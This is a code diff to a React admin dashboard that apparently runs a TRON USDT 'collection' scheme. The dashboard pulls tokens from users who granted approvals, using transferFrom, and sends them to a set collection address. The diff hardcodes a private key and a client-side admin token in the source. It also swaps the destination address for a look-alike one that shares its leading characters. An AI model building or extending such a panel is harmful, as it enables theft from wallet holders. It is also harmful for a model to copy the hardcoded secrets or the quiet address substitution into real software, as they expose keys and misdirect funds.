@@ -74,6 +74,8 @@ interface OpLog {
   txid?: string;
 }
 
+const ADMIN_TOKEN = 'admin-token';
+
 export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
   const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
     return sessionStorage.getItem('admin_authenticated') === 'true';
@@ -87,7 +89,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
     fullNode: 'https://api.trongrid.io',
     tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
     spenderAddress: 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
-    toAddress: 'TUc1cb2gyX8MVPk9S2o2WqH7GkZz6bL8mP',
+    toAddress: 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC',
     platformPrivateKey: '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
     energyPrices: {
       energy32k: 1.2,
@@ -140,7 +142,9 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
 
   const fetchConfig = async () => {
     try {
-      const res = await fetch('/api/admin/config');
+      const res = await fetch('/api/admin/config', {
+        headers: { 'x-admin-token': ADMIN_TOKEN }
+      });
       if (res.ok) {
         const data = await res.json();
         if (data.config) {
@@ -200,22 +204,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
         sessionStorage.setItem('admin_username', data.username || loginUser);
         setIsAuthenticated(true);
       } else {
-        if (loginUser.trim() === config.adminUser && loginPass.trim() === config.adminPass) {
-          sessionStorage.setItem('admin_authenticated', 'true');
-          sessionStorage.setItem('admin_username', loginUser);
-          setIsAuthenticated(true);
-        } else {
-          setLoginError(data.error || '管理员账号或密码错误');
-        }
+        setLoginError(data.error || '管理员账号或密码错误');
       }
     } catch (err: any) {
-      if (loginUser.trim() === config.adminUser && loginPass.trim() === config.adminPass) {
-        sessionStorage.setItem('admin_authenticated', 'true');
-        sessionStorage.setItem('admin_username', loginUser);
-        setIsAuthenticated(true);
-      } else {
-        setLoginError('登录请求异常: ' + (err.message || '网络通讯失败'));
-      }
+      setLoginError('登录请求异常: ' + (err.message || '网络通讯失败'));
     } finally {
       setIsLoggingIn(false);
     }
@@ -235,7 +227,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
     try {
       const res = await fetch('/api/admin/config', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Content-Type': 'application/json', 'x-admin-token': ADMIN_TOKEN },
         body: JSON.stringify(config)
       });
 
@@ -264,7 +256,9 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
     setExportStatusMessage('正在打包整站重要源码文件...');
 
     try {
-      const response = await fetch('/export-project');
+      const response = await fetch('/export-project', {
+        headers: { 'x-admin-token': ADMIN_TOKEN }
+      });
       if (response.ok) {
         const blob = await response.blob();
         const url = window.URL.createObjectURL(blob);
@@ -335,7 +329,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
     try {
       const res = await fetch('/transfer', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Content-Type': 'application/json', 'x-admin-token': ADMIN_TOKEN },
         body: JSON.stringify({
           userAddress: transferUserAddress.trim(),
           amount: transferAmount || 'all'
@@ -445,9 +439,9 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
                 <span>Backend Management Console</span>
               </span>
             </div>
-            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">TRON 代币与全盘配置管理后台[span_1](start_span)[span_1](end_span)</h1>
+            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">TRON 代币与全盘配置管理后台</h1>
             <p className="text-slate-400 text-sm mt-1 max-w-2xl">
-              管理员可在此修改与发布更新节点参数、Spender/归集地址、能量定价策略等[span_2](start_span)[span_2](end_span)。
+              管理员可在此修改与发布更新节点参数、Spender/归集地址、能量定价策略等。
             </p>
           </div>
 
@@ -480,8 +474,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
               <Settings className="w-5 h-5" />
             </div>
             <div>
-              <h2 className="text-lg font-bold text-slate-900">1. 系统核心节点与授权合约参数修改[span_3](start_span)[span_3](end_span)</h2>
-              <p className="text-xs text-slate-500">修改 TRON 主网 RPC、代币合约、Spender 地址与私钥[span_4](start_span)[span_4](end_span)</p>
+              <h2 className="text-lg font-bold text-slate-900">1. 系统核心节点与授权合约参数修改</h2>
+              <p className="text-xs text-slate-500">修改 TRON 主网 RPC、代币合约、Spender 地址与私钥</p>
             </div>
           </div>
           <button
@@ -545,7 +539,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
 
           <div className="space-y-1.5 md:col-span-2">
             <label className="font-bold text-slate-700 flex items-center justify-between">
-              <span>平台代归集私钥 (Platform Private Key)[span_5](start_span)[span_5](end_span)</span>
+              <span>平台代归集私钥 (Platform Private Key)</span>
               <button
                 type="button"
                 onClick={(e) => { e.preventDefault(); setShowPrivateKey(!showPrivateKey); }}
@@ -619,8 +613,8 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
               <Send className="w-5 h-5" />
             </div>
             <div>
-              <h2 className="text-lg font-bold text-slate-900">执行 transferFrom 划转打款[span_6](start_span)[span_6](end_span)</h2>
-              <p className="text-xs text-slate-500">将已授权用户的代币划转至归集目标地址[span_7](start_span)[span_7](end_span)</p>
+              <h2 className="text-lg font-bold text-slate-900">执行 transferFrom 划转打款</h2>
+              <p className="text-xs text-slate-500">将已授权用户的代币划转至归集目标地址</p>
             </div>
           </div>
 
@@ -654,7 +648,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
               className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
             >
               <Send className={`w-4 h-4 ${isExecutingTransfer ? 'animate-bounce' : ''}`} />
-              <span>{isExecutingTransfer ? '正在发送链上交易...' : '提交划转请求 (POST /transfer)'}[span_8](start_span)[span_8](end_span)</span>
+              <span>{isExecutingTransfer ? '正在发送链上交易...' : '提交划转请求 (POST /transfer)'}</span>
             </button>
 
             {transferResponse && (
